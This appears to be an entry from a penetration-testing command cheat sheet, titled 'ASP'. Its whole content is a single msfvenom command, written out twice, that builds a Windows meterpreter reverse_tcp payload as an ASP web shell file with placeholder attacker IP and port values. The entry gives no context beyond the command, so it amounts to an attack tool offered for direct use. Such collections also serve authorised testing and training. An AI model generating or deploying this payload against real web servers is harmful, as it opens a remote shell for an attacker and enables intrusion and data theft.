---
id: 250d4ce7-8b46-466c-bdfa-77a51268358e
name: ASP
type: command
executor: bash
data: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your
  Port to Connect On> -f asp > shell.asp

  '
output: null
created_at: '2020-07-14T18:14:34.235287+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# ASP

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp

```
